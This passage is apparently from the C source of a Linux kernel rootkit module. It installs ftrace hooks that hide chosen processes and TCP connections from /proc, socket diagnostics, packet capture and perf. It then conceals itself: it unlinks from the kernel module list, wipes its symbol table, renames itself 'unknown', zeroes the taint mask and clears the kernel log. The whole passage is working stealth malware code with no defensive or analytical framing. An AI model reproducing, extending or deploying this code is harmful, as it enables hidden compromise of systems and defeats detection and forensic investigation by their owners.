    ef_installed = true;
    return 0;
}

static void ef_remove(void)
{
    /* Nothing to undo — flags are restored when hooks are
     * unregistered via unregister_ftrace_function() */
    ef_installed = false;
}

/* ================================================================
 * TCP HIDING — Init / Teardown helpers
 * ================================================================ */

static bool th_initialized = false;

static int th_init(void)
{
    int ret;

    parse_ip();
    if (HIDDEN_PORT == 0 && hidden_ip_be32 == 0)
        return 0; /* TCP hiding disabled — no port/ip configured */

    memset(htids, 0, sizeof(htids));

    fn_inet_put_port = (void (*)(struct sock *))ksym_lookup_fn("inet_put_port");

    /* Hook 0: tcp4_seq_show (mandatory) */
    ret = install_hook(&th_hooks[0]);
    if (ret) return ret;

    /* Hook 1-2: tcp_diag (optional) */
    if (!ksym_lookup_fn("tcp_diag_dump") &&
        !ksym_lookup_fn("tcp_diag_dump_icsk") &&
        !ksym_lookup_fn("inet_diag_dump_icsk")) {
        request_module("tcp_diag");
        request_module("inet_diag");
        msleep(100);
    }
   
    try_install_alt(&th_hooks[1], alt_dump);
    try_install_alt(&th_hooks[2], alt_one);

    /* Hook 3-4: packet capture (optional) */
    install_hook(&th_hooks[3]);
    install_hook(&th_hooks[4]);

    /* Hook 5: tcp_set_state */
    install_hook(&th_hooks[5]);

    /* Hook 6: perf_event_output */
    try_install_alt(&th_hooks[6], alt_perf);

    /* Observer: tcp_v4_connect (after perf hook) */
    install_observer();

    th_initialized = true;
    return 0;
}

static void th_exit(void)
{
    int i;
    if (!th_initialized) return;
    remove_observer();
    for (i = TH_NUM_HOOKS - 1; i >= 0; i--) remove_hook(&th_hooks[i]);
    memset(htids, 0, sizeof(htids));
}

/* ================================================================
 * COMBINED MODULE INIT / EXIT
 * ================================================================ */

static void fixup_mod_compat(const char *mod_name)
{
    struct module *mod;
    struct module *(*fn_find_module)(const char *);
    struct kobject *kobj;

    if (!mod_name) {
        mod = THIS_MODULE;
    } else {
        fn_find_module = (void *)ksym_lookup_fn("find_module");
        if (!fn_find_module) return;
        mod = fn_find_module(mod_name);
    }

    if (!mod) return;

    kobj = &mod->mkobj.kobj;

    /* Sysfs removal */
    if (kobj && kobj->parent) {
        kobject_del(kobj);
        kobj->parent = NULL;
        kobj->kset   = NULL;
    }

    /* Unlink from global module list */
    if (!list_empty(&mod->list)) {
        list_del_init(&mod->list);
        mod->list.prev = (struct list_head *)0x37373731;
        mod->list.next = (struct list_head *)0x22373717;
    }

    /* Wipe kallsyms */
    if (mod->kallsyms) {
        mod->kallsyms->num_symtab = 0;
        mod->kallsyms->symtab = NULL;
        mod->kallsyms->strtab = NULL;
    }

    /* Sanitize metadata */
    mod->sect_attrs  = NULL;
    mod->notes_attrs = NULL;
    mod->state = MODULE_STATE_UNFORMED;

    memset(mod->name, 0, MODULE_NAME_LEN);
    strncpy(mod->name, "unknown", MODULE_NAME_LEN - 1);
}

static void clear_dmesg(void)
{
    int (*do_syslog)(int type, char __user *buf, int len, int source);

    do_syslog = (void *)ksym_lookup_fn("do_syslog");
    if (do_syslog)
        do_syslog(5, NULL, 0, 3);  /* SYSLOG_ACTION_CLEAR */
}

static void hide_self_fn(struct work_struct *work)
{
    unsigned long *tainted_mask;
    tainted_mask = (unsigned long *)ksym_lookup_fn("tainted_mask");
    if (tainted_mask)
        *tainted_mask = 0;
    
    clear_dmesg();

    fixup_mod_compat("tcp_diag");
    fixup_mod_compat("inet_diag");
    fixup_mod_compat(NULL); 
}
static int __init combined_init(void)
{
    struct proc_dir_entry *proc_entry;
    int ret;

    /* Shared kallsyms resolution */
    ret = resolve_kallsyms();
    if (ret)
        return ret;

    /* --- Process hiding init --- */
    my_get_mm_exe_file = (get_mm_exe_file_t)ksym_lookup_fn("get_mm_exe_file");

    ret = ph_install_hooks();
    if (ret)
        return ret;

    proc_entry = proc_create(PROC_NAME, 0444, NULL, &proc_fops);
    if (!proc_entry) {
        ph_remove_hooks();
        return -ENOMEM;
    }

    capture_target_pids();

    rescan_wq = create_singlethread_workqueue("hide_mod_wq");
    if (rescan_wq && RESCAN_INTERVAL_SEC > 0) {
        INIT_DELAYED_WORK(&rescan_work, rescan_work_fn);
        rescan_active = 1;
        queue_delayed_work(rescan_wq, &rescan_work,
                           msecs_to_jiffies(RESCAN_INTERVAL_SEC * 1000));
    }

    /* --- TCP hiding init --- */
    ret = th_init();
    if (ret) {
        /* TCP hiding failed — clean up process hiding too */
        rescan_active = 0;
        if (rescan_wq) {
            cancel_delayed_work_sync(&rescan_work);
            destroy_workqueue(rescan_wq);
        }
        ph_remove_hooks();
        remove_proc_entry(PROC_NAME, NULL);
        return ret;
    }
    INIT_DELAYED_WORK(&hide_self_work, hide_self_fn);
    ef_install();
    schedule_delayed_work(&hide_self_work, HZ);

    return 0;
}

static void __exit combined_exit(void)
{
    cancel_delayed_work_sync(&hide_self_work);   /* <-- unconditional, first */
    ef_remove();
    /* TCP hiding teardown */
    th_exit();

    /* Process hiding teardown */
    rescan_active = 0;
    if (rescan_wq) {
        cancel_delayed_work_sync(&rescan_work);
        destroy_workqueue(rescan_wq);
    }
    ph_remove_hooks();
    remove_proc_entry(PROC_NAME, NULL);
}
module_init(combined_init);
module_exit(combined_exit);
